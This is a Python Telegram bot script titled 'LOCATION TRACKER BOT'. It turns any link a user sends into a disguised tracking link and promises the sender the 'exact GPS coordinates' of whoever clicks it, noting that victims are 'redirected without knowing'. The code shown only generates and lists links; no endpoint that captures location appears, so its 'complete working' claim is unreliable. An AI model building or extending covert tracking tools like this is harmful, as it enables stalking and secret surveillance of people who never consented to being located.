# simple_bot.py - COMPLETE WORKING BOT
import os
import logging
import requests
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# Setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Token
BOT_TOKEN = os.environ.get('BOT_TOKEN')

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN not set!")
    exit(1)

logger.info("✅ Bot started!")

# ============================================
# DATA STORAGE
# ============================================
user_links = {}
tracking_data = {}

# ============================================
# HELPERS
# ============================================

def generate_slug():
    import random
    import string
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

# ============================================
# COMMANDS - ALL WORKING!
# ============================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome message with buttons"""
    keyboard = [
        [
            InlineKeyboardButton("🔗 Create Link", callback_data="create"),
            InlineKeyboardButton("📋 My Links", callback_data="links")
        ],
        [
            InlineKeyboardButton("📊 Stats", callback_data="stats"),
            InlineKeyboardButton("📡 Monitor", callback_data="monitor")
        ],
        [
            InlineKeyboardButton("❓ Help", callback_data="help")
        ]
    ]
    
    await update.message.reply_text(
        "🚀 <b>LOCATION TRACKER BOT</b>\n\n"
        "Send me ANY link and I'll create a tracking link!\n\n"
        "👇 <b>Send me a link NOW!</b>",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def create(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Create link command"""
    await update.message.reply_text(
        "🔗 <b>SEND ME A LINK</b>\n\n"
        "Send me any URL (YouTube, TikTok, etc.)\n"
        "Example: https://vt.tiktok.com/xxx",
        parse_mode='HTML'
    )

async def links(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's links"""
    user_id = update.effective_user.id
    
    if user_id not in user_links or not user_links[user_id]:
        await update.message.reply_text(
            "📋 <b>YOUR LINKS</b>\n\n"
            "You haven't created any links yet.\n"
            "Send me a link to get started!",
            parse_mode='HTML'
        )
        return
    
    message = "📋 <b>YOUR TRACKING LINKS</b>\n\n"
    for link in user_links[user_id]:
        message += f"🔗 <b>{link['slug']}</b>\n"
        message += f"   🎯 {link['redirect'][:40]}...\n"
        message += f"   👤 {link['visits']} visits\n\n"
    
    await update.message.reply_text(message, parse_mode='HTML')

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    user_id = update.effective_user.id
    
    total_links = len(user_links.get(user_id, []))
    total_visits = 0
    for link in user_links.get(user_id, []):
        total_visits += link['visits']
    
    await update.message.reply_text(
        f"📊 <b>YOUR STATISTICS</b>\n\n"
        f"📌 Total Links: {total_links}\n"
        f"👤 Total Visitors: {total_visits}\n",
        parse_mode='HTML'
    )

async def monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Monitor visits"""
    await update.message.reply_text(
        "📡 <b>LIVE MONITOR</b>\n\n"
        "Share your tracking links and I'll notify you when someone clicks them!",
        parse_mode='HTML'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help menu"""
    await update.message.reply_text(
        "📖 <b>HELP</b>\n\n"
        "1. Send me ANY link\n"
        "2. I create a tracking link\n"
        "3. Share the tracking link\n"
        "4. Get location when someone clicks!\n\n"
        "📍 <b>You'll get:</b>\n"
        "• Exact GPS coordinates\n"
        "• Google Maps link\n"
        "• Location pin\n\n"
        "Commands:\n"
        "/start - Show menu\n"
        "/create - Create tracking link\n"
        "/links - View your links\n"
        "/stats - View statistics\n"
        "/monitor - Live monitor\n"
        "/help - Show help",
        parse_mode='HTML'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel operation"""
    await update.message.reply_text(
        "❌ Cancelled!\n\n"
        "Send me a link to create a tracking link.",
        parse_mode='HTML'
    )

async def settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Settings menu"""
    await update.message.reply_text(
        "⚙️ <b>SETTINGS</b>\n\n"
        "Notifications: ON\n"
        "Location Accuracy: High\n\n"
        "More settings coming soon!",
        parse_mode='HTML'
    )

# ============================================
# HANDLE LINK MESSAGES
# ============================================

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """When user sends a link, create tracking link"""
    text = update.message.text
    user_id = update.effective_user.id
    
    if not text.startswith(('http://', 'https://')):
        await update.message.reply_text(
            "❌ Please send a valid link starting with http:// or https://"
        )
        return
    
    slug = generate_slug()
    
    # Store tracking data
    tracking_data[slug] = {
        'redirect': text,
        'owner': user_id,
        'visits': [],
        'created': datetime.now().isoformat()
    }
    
    if user_id not in user_links:
        user_links[user_id] = []
    user_links[user_id].append({
        'slug': slug,
        'redirect': text,
        'visits': 0,
        'created': datetime.now().isoformat()
    })
    
    # Create tracking link
    base_url = os.environ.get('RENDER_URL', 'https://location-tracker-xyai.onrender.com')
    tracking_link = f"{base_url}/track/{slug}"
    
    await update.message.reply_text(
        f"✅ <b>TRACKING LINK CREATED!</b>\n\n"
        f"🔗 <b>Your tracking link:</b>\n"
        f"<code>{tracking_link}</code>\n\n"
        f"🎯 <b>Redirects to:</b>\n"
        f"<code>{text}</code>\n\n"
        f"📍 Share this link! When someone clicks it, you'll get their location!\n\n"
        f"🔄 They'll be redirected without knowing!",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 My Links", callback_data="links")],
            [InlineKeyboardButton("🔗 Create Another", callback_data="create")]
        ])
    )

# ============================================
# BUTTON HANDLERS
# ============================================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = update.effective_user.id
    
    if data == "create":
        await query.edit_message_text(
            "🔗 <b>SEND ME A LINK</b>\n\n"
            "Send me any URL (YouTube, TikTok, etc.)\n"
            "Example: https://vt.tiktok.com/xxx",
            parse_mode='HTML'
        )
    
    elif data == "links":
        if user_id not in user_links or not user_links[user_id]:
            await query.edit_message_text(
                "📋 <b>YOUR LINKS</b>\n\n"
                "You haven't created any links yet.",
                parse_mode='HTML'
            )
            return
        
        message = "📋 <b>YOUR TRACKING LINKS</b>\n\n"
        for link in user_links[user_id]:
            message += f"🔗 <b>{link['slug']}</b>\n"
            message += f"   🎯 {link['redirect'][:40]}...\n"
            message += f"   👤 {link['visits']} visits\n\n"
        
        await query.edit_message_text(message, parse_mode='HTML')
    
    elif data == "stats":
        total_links = len(user_links.get(user_id, []))
        total_visits = 0
        for link in user_links.get(user_id, []):
            total_visits += link['visits']
        
        await query.edit_message_text(
            f"📊 <b>YOUR STATISTICS</b>\n\n"
            f"📌 Total Links: {total_links}\n"
            f"👤 Total Visitors: {total_visits}\n",
            parse_mode='HTML'
        )
    
    elif data == "monitor":
        await query.edit_message_text(
            "📡 <b>LIVE MONITOR</b>\n\n"
            "Share your links and I'll track visits!",
            parse_mode='HTML'
        )
    
    elif data == "help":
        await query.edit_message_text(
            "📖 <b>HELP</b>\n\n"
            "1. Send me ANY link\n"
            "2. I create a tracking link\n"
            "3. Share the tracking link\n"
            "4. Get location when someone clicks!\n\n"
            "🔗 <b>Send me a link NOW!</b>",
            parse_mode='HTML'
        )
    
    keyboard = [[InlineKeyboardButton("🔙 Menu", callback_data="back")]]
    await query.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(keyboard))

async def back_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [
            InlineKeyboardButton("🔗 Create Link", callback_data="create"),
            InlineKeyboardButton("📋 My Links", callback_data="links")
        ],
        [
            InlineKeyboardButton("📊 Stats", callback_data="stats"),
            InlineKeyboardButton("📡 Monitor", callback_data="monitor")
        ],
        [
            InlineKeyboardButton("❓ Help", callback_data="help")
        ]
    ]
    
    await query.edit_message_text(
        "🚀 <b>LOCATION TRACKER BOT</b>\n\n"
        "Send me ANY link to create a tracking link!\n\n"
        "👇 <b>Send me a link now!</b>",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ============================================
# MAIN
# ============================================

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # All commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("create", create))
    app.add_handler(CommandHandler("links", links))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("monitor", monitor))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("settings", settings))
    
    # Handle links
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
    
    # Button handlers
    app.add_handler(CallbackQueryHandler(button_handler, pattern="^(create|links|stats|monitor|help)$"))
    app.add_handler(CallbackQueryHandler(back_handler, pattern="^back$"))
    
    logger.info("🚀 Bot is running! Send me a link!")
    app.run_polling()

if __name__ == "__main__":
    main()
